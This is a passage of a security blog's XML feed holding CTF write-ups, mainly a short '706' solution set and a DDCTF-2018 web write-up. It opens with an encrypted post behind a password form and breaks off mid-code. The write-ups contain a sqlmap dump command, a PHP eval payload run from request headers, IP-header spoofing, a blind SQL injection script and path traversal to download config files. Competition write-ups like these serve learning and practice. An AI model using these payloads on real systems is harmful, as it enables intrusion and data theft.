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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;其实对于RSA加密算法攻击的文章，互联网上已经有很多了，所以本文主要还是以整理为主，只列出每种攻击方式的攻击条件、需要的一些工具、具体操作步骤等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
      <category term="crypto" scheme="https://winter3un.github.io/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018 706 writeup</title>
    <link href="https://winter3un.github.io/2018/07/09/2018-706-wp/"/>
    <id>https://winter3un.github.io/2018/07/09/2018-706-wp/</id>
    <published>2018-07-09T11:00:43.000Z</published>
    <updated>2018-07-10T00:52:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>706测试的题目，wp简单写下。</p><a id="more"></a><h2 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h2><p>两张图叠加，010处理下就出来了。</p><h2 id="Misc2"><a href="#Misc2" class="headerlink" title="Misc2"></a>Misc2</h2><p>png的长度设置长一点就出flag</p><h2 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h2><p>steg 打开，RGB三个最低色道分别来一次，flag组合下就出来了。</p><h2 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h2><p>流量包内有jsfuck编码的密码，log文件内有rar文件，拿密码去解压rar文件，就出flag</p><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>flag直接写在main函数里了。。</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>题目算法似乎有问题，反正我是没解出来，好像有人解出来了- -，真流弊</p><h2 id="crypt1"><a href="#crypt1" class="headerlink" title="crypt1"></a>crypt1</h2><p>直接写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#-*- coding:utf8 -*-</span></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES,DES3</div><div class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">()</span>:</span></div><div class="line">flag=open(<span class="string">"flag.txt"</span>,<span class="string">"rb"</span>).read().strip()</div><div class="line">paclen=<span class="number">8</span>-len(flag)%<span class="number">8</span></div><div class="line">flag+=paclen*(chr(paclen))</div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">s1=obj1.encrypt(flag)</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.encrypt(s1)</div><div class="line"><span class="keyword">with</span> open(<span class="string">"flag.enc"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</div><div class="line">f.write(s2)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></div><div class="line">s1=open(<span class="string">"flag.enc"</span>,<span class="string">"rb"</span>).read()</div><div class="line"></div><div class="line">key2=<span class="string">"and_you_know_aes"</span></div><div class="line">iv=md5(key2).digest()</div><div class="line">obj2=AES.new(key2,AES.MODE_CBC,iv)</div><div class="line">s2=obj2.decrypt(s1)</div><div class="line"></div><div class="line"></div><div class="line">key1=<span class="string">"do_you_know_des3"</span></div><div class="line">obj1=DES3.new(key1,DES3.MODE_ECB)</div><div class="line">flag=obj1.decrypt(s2)</div><div class="line"></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"></div><div class="line">decrypt()</div></pre></td></tr></table></figure><h2 id="crypt2"><a href="#crypt2" class="headerlink" title="crypt2"></a>crypt2</h2><p>Coppersmith攻击了解一下。</p><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>静态编译，ROPgadget了解一下。</p><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>根据0ctf2018 babyheap改的题，把off by one改没了，不知道怎么做= =</p><h2 id="web1-web7"><a href="#web1-web7" class="headerlink" title="web1-web7"></a>web1-web7</h2><p>全是原题，不会做的话，实验吧刷题了解一下。</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>有waf的报错注入，waf只是为了限制考点，很容易绕过</p><h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>格式化字符串，sqlmap了解一下</p><p><code>sqlmap -r post -p username --prefix &quot;%1$&#39;&quot; --suffix &quot;#&quot; -v3 --technique=T -D ctf -T flag --dump</code></p><h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>命令执行，rctf原题改，getallheaders被禁用了，但是apache_request_headers可以</p><p>payload为<code>eval(next(apache_request_headers()));</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;706测试的题目，wp简单写下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>DDCTF-2018  WEB WRITEUP</title>
    <link href="https://winter3un.github.io/2018/04/19/ddctf-2018/"/>
    <id>https://winter3un.github.io/2018/04/19/ddctf-2018/</id>
    <published>2018-04-20T05:44:11.000Z</published>
    <updated>2018-04-20T05:48:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。</p><a id="more"></a><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><img src="/2018/04/19/ddctf-2018/1.png" alt="1.png" title=""><p>非法链接的问题，直接在http头中加入以下键值对绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">X-Originating-IP: 123.232.23.245</div><div class="line">X-Forwarded-For: 123.232.23.245</div><div class="line">X-Remote-IP: 123.232.23.245</div><div class="line">X-Remote-Addr: 123.232.23.245</div></pre></td></tr></table></figure></p><p>其实也可以配置burp的插件bypass waf（<a href="https://www.codewatch.org/blog/?p=408" target="_blank" rel="external">https://www.codewatch.org/blog/?p=408</a> ） ，来绕过限制正常在客户端浏览。</p><img src="/2018/04/19/ddctf-2018/2.png" alt="2.png" title=""><p>emmm…明显考察注入，不过这边的注入点比较隐蔽，在<code>author</code>参数这儿，页面上隐藏了输入点，我们可以直接写python脚本通过盲注的手法跑出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> time</div><div class="line"><span class="keyword">import</span> hashlib</div><div class="line"></div><div class="line">s = <span class="string">''</span></div><div class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">0x20</span>):</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x30</span>,<span class="number">0x7f</span>):</div><div class="line">id = <span class="string">""</span></div><div class="line">title = <span class="string">""</span></div><div class="line">date = <span class="string">""</span></div><div class="line">author = <span class="string">"-1'||if(ord(substr((select secvalue from ctf_key9 limit 0,1),"</span>+str(index)+<span class="string">",1))="</span>+str(i)+<span class="string">",0,1)#"</span></div><div class="line"></div><div class="line"><span class="comment"># select * from content where id = ? and author = ' -1' ||  ' and date = ' = 'a' union '   </span></div><div class="line"></div><div class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"127.0.0.1:8080"</span>&#125;</div><div class="line"></div><div class="line">data = &#123; <span class="string">"id"</span>:id,</div><div class="line"><span class="string">"title"</span>:title,</div><div class="line"><span class="string">"author"</span>:author,</div><div class="line"><span class="string">"data"</span>:date,</div><div class="line"><span class="string">"button"</span>:<span class="string">"search"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">t = str(int(time.time()))</div><div class="line"></div><div class="line">str0 = <span class="string">'id='</span>+id+<span class="string">'title='</span>+title+<span class="string">'author='</span>+author+<span class="string">'date='</span>+date+<span class="string">'time='</span>+t+<span class="string">'adrefkfweodfsdpiru'</span></div><div class="line"></div><div class="line"></div><div class="line">sig = hashlib.sha1(str0).hexdigest()</div><div class="line"></div><div class="line"></div><div class="line">ip = <span class="string">'123.232.23.245'</span></div><div class="line"></div><div class="line">headers  = &#123;<span class="string">'X-Originating-IP'</span>: ip,</div><div class="line"><span class="string">'X-Forwarded-For'</span>: ip,</div><div class="line"><span class="string">'X-Remote-IP'</span>: ip,</div><div class="line"><span class="string">'X-Remote-Addr'</span>: ip,</div><div class="line"><span class="string">'X-Client-IP'</span>: ip,</div><div class="line"><span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"</span>,</div><div class="line"><span class="string">'Referer'</span>:<span class="string">"http://123.232.23.245/"</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> len(requests.post(url=<span class="string">"http://116.85.43.88:8080/NQYPTEMNWRQIYLEP/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+str(int(time.time())),data=data,headers=headers,proxies=proxies).content) != <span class="number">2420</span>:</div><div class="line">s += chr(i)</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> s</div><div class="line"><span class="comment"># print str0</span></div></pre></td></tr></table></figure><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>web2的难度明显要比web1要高。</p><p>点击链接进去后，直接<code>ctrl+u</code>看源码，发现了可疑的链接<br><img src="/2018/04/19/ddctf-2018/3.png" alt="3.png" title=""></p><p>将<code>ZmF2aWNvbi5pY28=</code> base64解码后，发现是<code>favicon.ico</code> ，初步判断该<code>api</code>应该存在任意文件下载漏洞。</p><p>接下来通过构造<code>web.xml</code>的地址(<code>../../WEB-INF/web.xml</code> —base64&gt;&gt;&gt; <code>Li4vLi4vV0VCLUlORi93ZWIueG1s</code>)，并利用该漏洞，下载该配置文件。</p><p>下载完了以后分析该<code>web.xml</code>文件，在文件内发现其他关联的文件，仿照上一步操作，将所有相关的文件都下载到本地分析。</p><p>在<code>web.xml</code>中发现该<code>class</code>文件</p><img src="/2018/04/19/ddctf-2018/4.png" alt="4.png" title=""><p>下载至本地后，用<code>GD-GUI</code>分析发现为<code>flag</code>的加密算法</p><img src="/2018/04/19/ddctf-2018/5.png" alt="5.png" title=""><p>但是我们缺少关键的<code>email</code>和<code>flag</code>密文，继续寻找相关文件，开了下脑洞，猜测控制器文件<code>FlagController.class</code>,没想到真的有233333 下载下来分析。如图，只要我们给<code>email</code>就给我们加密后的<code>flag</code> 233333 </p><img src="/2018/04/19/ddctf-2018/6.png" alt="6.png" title=""><p>回到首页，发现<code>email</code>。。。</p><img src="/2018/04/19/ddctf-2018/7.png" alt="7.png" title=""><p>所有条件都齐全了，逆向算法，最后写出了对应的解密脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> java.io.File;</div><div class="line"><span class="keyword">import</span> java.io.FileInputStream;</div><div class="line"><span class="keyword">import</span> java.io.IOException;</div><div class="line"><span class="keyword">import</span> java.io.InputStream;</div><div class="line"><span class="keyword">import</span> java.io.PrintStream;</div><div class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</div><div class="line"><span class="keyword">import</span> java.security.Key;</div><div class="line"><span class="keyword">import</span> java.security.KeyStore;</div><div class="line"><span class="keyword">import</span> java.security.PublicKey;  </div><div class="line"><span class="keyword">import</span> java.security.KeyStoreException;</div><div class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</div><div class="line"><span class="keyword">import</span> java.security.SecureRandom;</div><div class="line"><span class="keyword">import</span> java.security.UnrecoverableKeyException;</div><div class="line"><span class="keyword">import</span> java.security.cert.CertificateException;</div><div class="line"><span class="keyword">import</span> java.util.Properties;</div><div class="line"><span class="keyword">import</span> java.util.UUID;</div><div class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Cipher;</div><div class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</div><div class="line"><span class="keyword">import</span> javax.crypto.Mac;</div><div class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</div><div class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;  </div><div class="line"><span class="keyword">import</span> sun.misc.BASE64Encoder;  </div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">decrypt</span></span></div><div class="line">&#123;</div><div class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] decryptBASE64(String key) <span class="keyword">throws</span> Exception &#123;  </div><div class="line">        <span class="keyword">return</span> (<span class="keyword">new</span> BASE64Decoder()).decodeBuffer(key);  </div><div class="line">    &#125;  </div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></div><div class="line">&#123;</div><div class="line"><span class="keyword">try</span>&#123;</div><div class="line">KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</div><div class="line">FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">"C:\\Users\\Administrator\\Desktop\\ddctf\\web2\\key\\sdl.ks"</span>);</div><div class="line">keyStore.load(inputStream, <span class="string">"sdl welcome you !"</span>.substring(<span class="number">0</span>, <span class="string">"sdl welcome you !"</span>.length() - <span class="number">1</span>).trim().replace(<span class="string">" "</span>, <span class="string">""</span>).toCharArray());</div><div class="line"></div><div class="line">PublicKey key = keyStore.getCertificate(<span class="string">"www.didichuxing.com"</span>).getPublicKey();  </div><div class="line">System.out.println(key);</div><div class="line">Cipher cipher = Cipher.getInstance(key.getAlgorithm());</div><div class="line">cipher.init(<span class="number">2</span>, key); </div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] text = decryptBASE64(<span class="string">"S1EgULNQ7TlSYnuzagfIe5gfmjYWZRJE7YBSKoaOGmYZ6yjkmbapuNDyQDiUyjV2mKDGm2hnhkgwA6l0qsdvD9uSOjStWMHHYerOZGvk8epWSQ8YYn2pWArUlV7m2e4nV6oqKYYXRMJVO8776JX00OY/MmUeaj6XoAHk4cWar3BpwAfLw3hsUYDM1NoVjBkPy/SS/DHDhf9YsM+3kF3hNmyUc7tqTvvb/1gzovigpmoAIzc8FDxeaBprG+084bkoIiMlBs8cUyUyZq4x7PD6jvVkb00kHUeVERPFIVxlbS1ph4jS+Wy6yd3GNaYe0wUUwoxd/5MiSG4Z4l4miFX8SQ=="</span>);</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">byte</span>[] doFinal = cipher.doFinal(text); </div><div class="line"></div><div class="line"></div><div class="line">System.out.println(byte2hex(doFinal));</div><div class="line">&#125;</div><div class="line"><span class="keyword">catch</span>(Exception e)</div><div class="line">&#123;</div><div class="line">System.out.println(<span class="string">"e:"</span>+e);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span 